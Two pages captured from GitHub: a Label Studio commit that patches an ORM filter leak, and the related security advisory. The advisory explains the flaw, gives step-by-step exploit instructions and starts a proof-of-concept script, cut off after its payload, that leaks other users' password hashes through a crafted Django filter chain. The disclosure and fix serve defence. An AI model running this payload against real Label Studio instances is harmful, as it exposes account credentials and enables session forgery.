=== Content from github.com_229f1828_20250114_182633.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2FHumanSignal%2Flabel-studio%2Fcommit%2Ff931d9d129002f54a495995774ce7384174cef5c)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2FHumanSignal%2Flabel-studio%2Fcommit%2Ff931d9d129002f54a495995774ce7384174cef5c)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fvoltron%2Fcommit_fragments%2Frepo_layout&source=header-repo&source_repo=HumanSignal%2Flabel-studio)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[HumanSignal](/HumanSignal)
/
**[label-studio](/HumanSignal/label-studio)**
Public

* [Notifications](/login?return_to=%2FHumanSignal%2Flabel-studio) You must be signed in to change notification settings
* [Fork
  2.5k](/login?return_to=%2FHumanSignal%2Flabel-studio)
* [Star
   20.2k](/login?return_to=%2FHumanSignal%2Flabel-studio)

* [Code](/HumanSignal/label-studio)
* [Issues
  861](/HumanSignal/label-studio/issues)
* [Pull requests
  62](/HumanSignal/label-studio/pulls)
* [Actions](/HumanSignal/label-studio/actions)
* [Projects
  0](/HumanSignal/label-studio/projects)
* [Security](/HumanSignal/label-studio/security)
* [Insights](/HumanSignal/label-studio/pulse)

Additional navigation options

* [Code](/HumanSignal/label-studio)
* [Issues](/HumanSignal/label-studio/issues)
* [Pull requests](/HumanSignal/label-studio/pulls)
* [Actions](/HumanSignal/label-studio/actions)
* [Projects](/HumanSignal/label-studio/projects)
* [Security](/HumanSignal/label-studio/security)
* [Insights](/HumanSignal/label-studio/pulse)

## Commit

[Permalink](/HumanSignal/label-studio/commit/f931d9d129002f54a495995774ce7384174cef5c)

This commit does not belong to any branch on this repository, and may belong to a fork outside of the repository.

fix: LEAP-237: Patch ORM Leak vulnerability in open source ([#5012](https://github.com/HumanSignal/label-studio/pull/5012))

[Browse files](/HumanSignal/label-studio/tree/f931d9d129002f54a495995774ce7384174cef5c)
Browse the repository at this point in the history

```
* fix: LEAP-237: Patch ORM Leak vulnerability in open source

* add further detail to docstring about security concern

* fix bug where string starts with desc marker
```

* Loading branch information

[![@jombooth](https://avatars.githubusercontent.com/u/3943358?s=40&v=4)](/jombooth)

[jombooth](/HumanSignal/label-studio/commits?author=jombooth "View all commits by jombooth")
committed
Nov 8, 2023

1 parent
[de252f5](/HumanSignal/label-studio/commit/de252f58c9f3ef76e907a5f181c49948a6b0362f)

commit f931d9d

 Show file tree

 Hide file tree

Showing
**5 changed files**
with
**351 additions**
and
**10 deletions**.

* Whitespace
* Ignore whitespace

* Split
* Unified

* label\_studio

  + core

    - settings

      * label\_studio/core/settings/base.py
        [base.py](#diff-6a0734f20b03b8a742088661655e0c27d3c4e240c7a200f8d8ae95239a476e9f)
    - utils

      * label\_studio/core/utils/params.py
        [params.py](#diff-412438c55d707ffd0f974df89d8f80ffc5aefabd6476aa007d40b40e78f19393)
  + data\_manager

    - label\_studio/data\_manager/functions.py
      [functions.py](#diff-b009be26e4dc4eb2598a5598aa73551331f75068d90bc36f0349edf667b88a65)
    - label\_studio/data\_manager/serializers.py
      [serializers.py](#diff-7ce60240b37e69943356ab25fe22bef989b3eed3066f58372bdfd8edb029b6db)
  + tests/data\_manager

    - label\_studio/tests/data\_manager/api\_tasks.tavern.yml
      [api\_tasks.tavern.yml](#diff-04084e159a614b56c422d355602ef9761b818055624c4b8f495dcd4eb3607061)

## There are no files selected for viewing

8 changes: 7 additions & 1 deletion

8
[label\_studio/core/settings/base.py](#diff-6a0734f20b03b8a742088661655e0c27d3c4e240c7a200f8d8ae95239a476e9f "label_studio/core/settings/base.py")

Show comments

[View file](/HumanSignal/label-studio/blob/f931d9d129002f54a495995774ce7384174cef5c/label_studio/core/settings/base.py)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -15,7 +15,7 @@ |
|  |  | import re |
|  |  | from datetime import timedelta |
|  |  |  |
|  |  | from label\_studio.core.utils.params import get\_bool\_env |
|  |  | from label\_studio.core.utils.params import get\_bool\_env, get\_env\_list |
|  |  |  |
|  |  | formatter = 'standard' |
|  |  | JSON\_LOG = get\_bool\_env('JSON\_LOG', False) |
| Expand Down  Expand Up | | @@ -667,3 +667,9 @@ def collect\_versions\_dummy(\*\*kwargs): |
|  |  | REAL\_HOSTNAME = os.getenv('HOSTNAME') # we have to use getenv, because we don't use LABEL\_STUDIO\_ prefix |
|  |  | GCS\_CLOUD\_STORAGE\_FORCE\_DEFAULT\_CREDENTIALS = get\_bool\_env('GCS\_CLOUD\_STORAGE\_FORCE\_DEFAULT\_CREDENTIALS', False) |
|  |  | PUBLIC\_API\_DOCS = get\_bool\_env('PUBLIC\_API\_DOCS', False) |
|  |  |  |
|  |  | # By default, we disallow filters with foreign keys in data manager for security reasons. |
|  |  | # Add to this list (either here in code, or via the env) to allow specific filters that rely on foreign keys. |
|  |  | DATA\_MANAGER\_FILTER\_ALLOWLIST = list( |
|  |  | set(get\_env\_list('DATA\_MANAGER\_FILTER\_ALLOWLIST') + ['updated\_by\_\_active\_organization']) |
|  |  | ) |

18 changes: 15 additions & 3 deletions

18
[label\_studio/core/utils/params.py](#diff-412438c55d707ffd0f974df89d8f80ffc5aefabd6476aa007d40b40e78f19393 "label_studio/core/utils/params.py")

Show comments

[View file](/HumanSignal/label-studio/blob/f931d9d129002f54a495995774ce7384174cef5c/label_studio/core/utils/params.py)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
|  |  | @@ -1,4 +1,5 @@ |
|  |  | import os |
|  |  | from typing import Callable, Optional, Sequence, TypeVar |
|  |  |  |
|  |  | from rest\_framework.exceptions import ValidationError |
|  |  |  |
| Expand Down  Expand Up | | @@ -125,16 +126,27 @@ def get\_bool\_env(key, default): |
|  |  | return get\_env(key, default, is\_bool=True) |
|  |  |  |
|  |  |  |
|  |  | def get\_env\_list\_int(key, default=None): |
|  |  | T = TypeVar('T') |
|  |  |  |
|  |  |  |
|  |  | def get\_env\_list( |
|  |  | key: str, default: Optional[Sequence[T]] = None, value\_transform: Callable[[str], T] = str |
|  |  | ) -> Sequence[T]: |
|  |  | """ |
|  |  | "1,2,3" in env variable => [1, 2, 3] in python |
|  |  | "foo,bar,baz" in env variable => ["foo", "bar", "baz"] in python. |
|  |  | Use value\_transform to convert the strings to any other type. |
|  |  | """ |
|  |  | value = get\_env(key) |
|  |  | if not value: |
|  |  | if default is None: |
|  |  | return [] |
|  |  | return default |
|  |  | return [int(el) for el in value.split(',')] |
|  |  |  |
|  |  | return [value\_transform(el) for el in value.split(',')] |
|  |  |  |
|  |  |  |
|  |  | def get\_env\_list\_int(key, default=None) -> Sequence[int]: |
|  |  | return get\_env\_list(key, default=default, value\_transform=int) |
|  |  |  |
|  |  |  |
|  |  | def get\_all\_env\_with\_prefix(prefix=None, is\_bool=True, default\_value=None): |
| Expand Down | |  |

37 changes: 32 additions & 5 deletions

37
[label\_studio/data\_manager/functions.py](#diff-b009be26e4dc4eb2598a5598aa73551331f75068d90bc36f0349edf667b88a65 "label_studio/data_manager/functions.py")

Show comments

[View file](/HumanSignal/label-studio/blob/f931d9d129002f54a495995774ce7384174cef5c/label_studio/data_manager/functions.py)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -2,6 +2,7 @@ |
|  |  | """ |
|  |  | import logging |
|  |  | from collections import OrderedDict |
|  |  | from typing import Tuple |
|  |  | from urllib.parse import unquote |
|  |  |  |
|  |  | import ujson as json |
| Expand Down  Expand Up | | @@ -337,11 +338,37 @@ def preprocess\_filter(\_filter, \*\_): |
|  |  | return \_filter |
|  |  |  |
|  |  |  |
|  |  | def preprocess\_field\_name(raw\_field\_name, only\_undefined\_field=False): |
|  |  | field\_name = raw\_field\_name.replace('filter:', '') |
|  |  | field\_name = field\_name.replace('tasks:', '') |
|  |  | ascending = False if field\_name[0] == '-' else True # detect direction |
|  |  | field\_name = field\_name[1:] if field\_name[0] == '-' else field\_name # remove direction |
|  |  | def preprocess\_field\_name(raw\_field\_name, only\_undefined\_field=False) -> Tuple[str, bool]: |
|  |  | """Transform a field name (as specified in the datamanager views endpoint) to |
|  |  | a django ORM field name. Also handle dotted accesses to task.data. |
|  |  |  |
|  |  | Edit with care; it's critical that this function not be changed in ways that |
|  |  | introduce vulnerabilities in the vein of the ORM Leak (see #5012). In particular |
|  |  | it is not advisable to use `replace` or other calls that replace all instances |
|  |  | of a string within this function. |
|  |  |  |
|  |  | Returns: Django ORM field name: str, Sort is ascending: bool |
|  |  | """ |
|  |  |  |
|  |  | field\_name = raw\_field\_name |
|  |  | ascending = True |
|  |  |  |
|  |  | # Descending marker `-` may come at the beginning of the string |
|  |  | if field\_name.startswith('-'): |
|  |  | ascending = False |
|  |  | field\_name = field\_name[1:] |
|  |  |  |
|  |  | # For security reasons, these must only be removed when they fall at the beginning of the string (or after `-`). |
|  |  | optional\_prefixes = ['filter:', 'tasks:'] |
|  |  | for prefix in optional\_prefixes: |
|  |  | if field\_name.startswith(prefix): |
|  |  | field\_name = field\_name[len(prefix) :] |
|  |  |  |
|  |  | # Descending marker may also come after other prefixes. Double negative is not allowed. |
|  |  | if ascending and field\_name.startswith('-'): |
|  |  | ascending = False |
|  |  | field\_name = field\_name[1:] |
|  |  |  |
|  |  | if field\_name.startswith('data.'): |
|  |  | if only\_undefined\_field: |
|  |  | field\_name = f'data\_\_{settings.DATA\_UNDEFINED\_NAME}' |
| Expand Down | |  |

44 changes: 44 additions & 0 deletions

44
[label\_studio/data\_manager/serializers.py](#diff-7ce60240b37e69943356ab25fe22bef989b3eed3066f58372bdfd8edb029b6db "label_studio/data_manager/serializers.py")

Show comments

[View file](/HumanSignal/label-studio/blob/f931d9d129002f54a495995774ce7384174cef5c/label_studio/data_manager/serializers.py)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -4,6 +4,7 @@ |
|  |  |  |
|  |  | import ujson as json |
|  |  | from data\_manager.models import Filter, FilterGroup, View |
|  |  | from django.conf import settings |
|  |  | from django.db import transaction |
|  |  | from projects.models import Project |
|  |  | from rest\_framework import serializers |
| Expand All | | @@ -18,6 +19,49 @@ class Meta: |
|  |  | model = Filter |
|  |  | fields = '\_\_all\_\_' |
|  |  |  |
|  |  | def validate\_column(self, column: str) -> str: |
|  |  | """ |
|  |  | Ensure that the passed filter expression starts with 'filter:tasks:' and contains |
|  |  | no foreign key traversals. This means either the filter expression contains no '\_\_' |
|  |  | substrings, or that it's the task.data json field that's accessed. |
|  |  |  |
|  |  | Users depending on foreign key traversals in views can allowlist them via the |
|  |  | DATA\_MANAGER\_FILTER\_ALLOWLIST setting in the env. |
|  |  |  |
|  |  | Edit with care. The validations below are critical for security. |
|  |  | """ |
|  |  |  |
|  |  | column\_copy = column |
|  |  |  |
|  |  | # We may support 'filter:annotations:' in the future, but we don't as of yet. |
|  |  | required\_prefix = 'filter:tasks:' |
|  |  | optional\_prefix = '-' |
|  |  |  |
|  |  | if not column\_copy.startswith(required\_prefix): |
|  |  | raise serializers.ValidationError(f'Filter "{column}" should start with "{required\_prefix}"') |
|  |  |  |
|  |  | column\_copy = column\_copy[len(required\_prefix) :] |
|  |  |  |
|  |  | if column\_copy.startswith(optional\_prefix): |
|  |  | column\_copy = column\_copy[len(optional\_prefix) :] |
|  |  |  |
|  |  | if column\_copy.startswith('data.'): |
|  |  | # Allow underscores if the filter is based on the `task.data` JSONField, because these don't leverage foreign keys. |
|  |  | return column |
|  |  |  |
|  |  | # Specific filters relying on foreign keys can be allowlisted |
|  |  | if column\_copy in settings.DATA\_MANAGER\_FILTER\_ALLOWLIST: |
|  |  | return column |
|  |  |  |
|  |  | # But in general, we don't allow foreign keys |
|  |  | if '\_\_' in column\_copy: |
|  |  | raise serializers.ValidationError( |
|  |  | f'"\_\_" is not generally allowed in filters. Consider asking your administrator to add "{column\_copy}" ' |
|  |  | 'to DATA\_MANAGER\_FILTER\_ALLOWLIST, but note that some filter expressions may pose a security risk' |
|  |  | ) |
|  |  |  |
|  |  | return column |
|  |  |  |
|  |  |  |
|  |  | class FilterGroupSerializer(serializers.ModelSerializer): |
|  |  | filters = FilterSerializer(many=True) |
| Expand Down | |  |

 Loading

Oops, something went wrong.
 Retry

Toggle all file notes
Toggle all file annotations

### 0 comments on commit `f931d9d`

Please
[sign in](/login?return_to=https%3A%2F%2Fgithub.com%2FHumanSignal%2Flabel-studio%2Fcommit%2Ff931d9d129002f54a495995774ce7384174cef5c) to comment.

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from github.com_81633e46_20250114_182635.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2FHumanSignal%2Flabel-studio%2Fsecurity%2Fadvisories%2FGHSA-6hjj-gq77-j4qw)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2FHumanSignal%2Flabel-studio%2Fsecurity%2Fadvisories%2FGHSA-6hjj-gq77-j4qw)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Frepos%2Fadvisories%2Fshow&source=header-repo&source_repo=HumanSignal%2Flabel-studio)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[HumanSignal](/HumanSignal)
/
**[label-studio](/HumanSignal/label-studio)**
Public

* [Notifications](/login?return_to=%2FHumanSignal%2Flabel-studio) You must be signed in to change notification settings
* [Fork
  2.5k](/login?return_to=%2FHumanSignal%2Flabel-studio)
* [Star
   20.2k](/login?return_to=%2FHumanSignal%2Flabel-studio)

* [Code](/HumanSignal/label-studio)
* [Issues
  861](/HumanSignal/label-studio/issues)
* [Pull requests
  62](/HumanSignal/label-studio/pulls)
* [Actions](/HumanSignal/label-studio/actions)
* [Projects
  0](/HumanSignal/label-studio/projects)
* [Security](/HumanSignal/label-studio/security)
* [Insights](/HumanSignal/label-studio/pulse)

Additional navigation options

* [Code](/HumanSignal/label-studio)
* [Issues](/HumanSignal/label-studio/issues)
* [Pull requests](/HumanSignal/label-studio/pulls)
* [Actions](/HumanSignal/label-studio/actions)
* [Projects](/HumanSignal/label-studio/projects)
* [Security](/HumanSignal/label-studio/security)
* [Insights](/HumanSignal/label-studio/pulse)

# Object Relational Mapper Leak Vulnerability in Filtering Task

High

[jombooth](/jombooth)
published
GHSA-6hjj-gq77-j4qw
Nov 13, 2023

## Package

pip

label-studio
([pip](/advisories?query=ecosystem%3Apip))

## Affected versions

<= 1.9.2

## Patched versions

1.9.2post0

## Description

# Introduction

This write-up describes a vulnerability found in [Label Studio](https://github.com/HumanSignal/label-studio), a popular open source data labeling tool. The vulnerability affects all versions of Label Studio prior to `1.9.2post0` and was tested on version `1.8.2`.

# Overview

In all current versions of [Label Studio](https://github.com/HumanSignal/label-studio), the application allows users to insecurely set filters for filtering tasks. An attacker can construct a *filter chain* to filter tasks based on sensitive fields for all user accounts on the platform by exploiting Django's Object Relational Mapper (ORM). Since the results of query can be manipulated by the ORM filter, an attacker can leak these sensitive fields character by character. For an example, the following filter chain will task results by the password hash of an account on Label Studio.

```
filter:tasks:updated_by__active_organization__active_users__password

```

For consistency, this type of vulnerability will be termed as **ORM Leak** in the rest of this disclosure.

In addition, Label Studio had a hard coded secret key that an attacker can use to forge a session token of any user by exploiting this ORM Leak vulnerability to leak account password hashes.

# Description

The following code snippet from the `ViewSetSerializer` in [`label_studio/data_manager/serializers.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/data_manager/serializers.py#L115) insecurely creates `Filter` objects from a JSON `POST` request to the `/api/dm/views/{viewId}` API endpoint.

```
    @staticmethod
    def _create_filters(filter_group, filters_data):
        filter_index = 0
        for filter_data in filters_data:
            filter_data["index"] = filter_index
            filter_group.filters.add(Filter.objects.create(**filter_data))
            filter_index += 1
```

These `Filter` objects are then applied in the `TaskQuerySet` in [`label_studio/data_manager/managers.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/data_manager/managers.py#L473).

```
class TaskQuerySet(models.QuerySet):
    def prepared(self, prepare_params=None):
        """ Apply filters, ordering and selected items to queryset

        :param prepare_params: prepare params with project, filters, orderings, etc
        :return: ordered and filtered queryset
        """
        from projects.models import Project

        queryset = self

        if prepare_params is None:
            return queryset

        project = Project.objects.get(pk=prepare_params.project)
        request = prepare_params.request
        queryset = apply_filters(queryset, prepare_params.filters, project, request) <1>
        queryset = apply_ordering(queryset, prepare_params.ordering, project, request, view_data=prepare_params.data)

        if not prepare_params.selectedItems:
            return queryset

        # included selected items
        if prepare_params.selectedItems.all is False and prepare_params.selectedItems.included:
            queryset = queryset.filter(id__in=prepare_params.selectedItems.included)

        # excluded selected items
        elif prepare_params.selectedItems.all is True and prepare_params.selectedItems.excluded:
            queryset = queryset.exclude(id__in=prepare_params.selectedItems.excluded)

        return queryset
```

1. User provided filters are insecurely applied here by calling the `apply_filters` that constructs the Django ORM filter.

The `PreparedTaskManager` in [`label_studio/data_manager/managers.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/data_manager/managers.py#L655) uses the vulnerable `TaskQuerySet` for building the Django queryset for querying `Task` objects, as shown in the following code snippet.

```
class PreparedTaskManager(models.Manager):
    #...

    def get_queryset(self, fields_for_evaluation=None, prepare_params=None, all_fields=False): <1>
        """
        :param fields_for_evaluation: list of annotated fields in task
        :param prepare_params: filters, ordering, selected items
        :param all_fields: evaluate all fields for task
        :param request: request for user extraction
        :return: task queryset with annotated fields
        """
        queryset = self.only_filtered(prepare_params=prepare_params)
        return self.annotate_queryset(
            queryset,
            fields_for_evaluation=fields_for_evaluation,
            all_fields=all_fields,
            request=prepare_params.request
        )

    def only_filtered(self, prepare_params=None):
        request = prepare_params.request
        queryset = TaskQuerySet(self.model).filter(project=prepare_params.project) <1>
        fields_for_filter_ordering = get_fields_for_filter_ordering(prepare_params)
        queryset = self.annotate_queryset(queryset, fields_for_evaluation=fields_for_filter_ordering, request=request)
        return queryset.prepared(prepare_params=prepare_params)
```

1. Special Django method for the `models.Manager` class that is used to retrieve the queryset for querying objects of a model.
2. Uses the vulnerable `TaskQuerySet` that was explained above.

The following code snippet of the `Task` model in [`label_studio/tasks/models.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/tasks/models.py#L49C1-L102C102) shows that the vulnerable `PreparedTaskManager` is set as a class variable, along with the `updated_by` relational mapping to a Django user that will be exploited as the entrypoint of the filter chain.

```
# ...
class Task(TaskMixin, models.Model):
    """ Business tasks from project
    """
    id = models.AutoField(auto_created=True, primary_key=True, serialize=False, verbose_name='ID', db_index=True)

    # ...

    updated_by = models.ForeignKey(settings.AUTH_USER_MODEL, related_name='updated_tasks',
        on_delete=models.SET_NULL, null=True, verbose_name=_('updated by'),
        help_text='Last annotator or reviewer who updated this task') <1>

    # ...

    objects = TaskManager()  # task manager by default
    prepared = PreparedTaskManager()  # task manager with filters, ordering, etc for data_manager app <2>

    # ...
```

1. The entry point of the filter chain to filter by the `updated_by__active_organization__active_users__password`.
2. The vulnerable `PreparedTaskManager` being set that will be exploited.

Finally, the `TaskListAPI` view set in [`label_studio/tasks/api.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/tasks/api.py#L205) with the `/api/tasks` API endpoint uses the vulnerable `PreparedTaskManager` to filter `Task` objects.

```
    def get_queryset(self):
        task_id = self.request.parser_context['kwargs'].get('pk')
        task = generics.get_object_or_404(Task, pk=task_id)
        review = bool_from_request(self.request.GET, 'review', False)
        selected = {"all": False, "included": [self.kwargs.get("pk")]}
        if review:
            kwargs = {
                'fields_for_evaluation': ['annotators', 'reviewed']
            }
        else:
            kwargs = {'all_fields': True}
        project = self.request.query_params.get('project') or self.request.data.get('project')
        if not project:
            project = task.project.id
        return self.prefetch(
            Task.prepared.get_queryset(
                prepare_params=PrepareParams(project=project, selectedItems=selected, request=self.request),
                **kwargs
            )) <1>
```

1. Uses the vulnerable `PreparedTaskManager` to filter objects.

# Proof of Concept

Below are the steps to exploit about how to exploit this vulnerability to leak the password hash of an account on Label Studio.

1. Create two accounts on Label Studio and choose one account to be the victim and the other the hacker account that you will use.
2. Create a new project or use an existing project, then add a task to the project. Update the task with the hacker account to cause the entry point of the filter chain.
3. Navigate to the task view for the project and add any filter with the `Network` inspect tab open on the browser. Look for a `PATCH` request to `/api/dm/views/{view_id}?interaction=filter&project={project_id}` and save the `view_id` and `project_id` for the next step.
4. Download the attached proof of concept exploit script named `labelstudio_ormleak.py`. This script will leak the password hash of the victim account character by character. Run the following command to run the exploit script, replacing the `{view_id}`, `{project_id}`, `{cookie_str}` and `{url}` with the corresponding values. For further explanation run `python3 labelstudio_ormleak.py --help`.

```
python3 labelstudio_ormleak.py -v {view_id} -p {project_id} -c '{cookie_str}' -u '{url}'
```

The following example GIF demonstrates exploiting this ORM Leak vulnerability to retrieve the password hash `pbkdf2_sha256$260000$KKeew1othBwMKk2QudmEgb$ALiopdBpWMwMDD628xeE1Ie7YSsKxdXdvWfo/PvVXvw=`.

[![labelstudio_ormleak_poc](https://user-images.githubusercontent.com/139727151/266986646-a3d1367c-fb4d-4482-9b6a-18a5d7316385.gif)](https://user-images.githubusercontent.com/139727151/266986646-a3d1367c-fb4d-4482-9b6a-18a5d7316385.gif)

# Impact

This vulnerability can be exploited to completely compromise the confidentiality of highly sensitive account information, such as account password hashes. For all versions `<=1.8.1`, this finding can also be chained with hard coded `SECRET_KEY` to forge session tokens of any user on Label Studio and could be abuse to deteriorate the integrity and availability.

# Remediation Advice

* Do not use unsanitised values for constructing a filter for querying objects using Django's ORM. Django's ORM allows querying by relation field and performs auto lookups, that enable filtering by sensitive fields.
* Validate filter values to an allow list before performing any queries.

# Discovered

* August 2023, Alex Brown, elttam

---

# `labelstudio_ormleak.py` proof of concept

```
import argparse
import re
import requests
import string
import sys

# Password hash characters
CHARS = string.ascii_letters + string.digits + '$/+=_!'
CHARS_LEN = len(CHARS)

PAYLOAD = {
    "data": {
        "columnsDisplayType": {},
        "columnsWidth": {},
        "filters": {
            "conjunction": "and",
            "items": [
                {
                    "filter": "filter:tasks:updated_by__active_organization__active_users__password", # ORM Leak filter chain
                    "operator": "regex", # Use regex operator to filter password hash value
                    "type": "String",
                    "value": "REPLACEME"
                }
            ]
        },
        "gridWidth": 4,
        "hiddenColumns":{"explore":["tasks:inner_id"],"labeling":["tasks:id","tasks:inner_id"]},
        "ordering": [],
        "search_text": None,
        "target": "tasks",
        "title": "Default",
        "type": "list"
    },
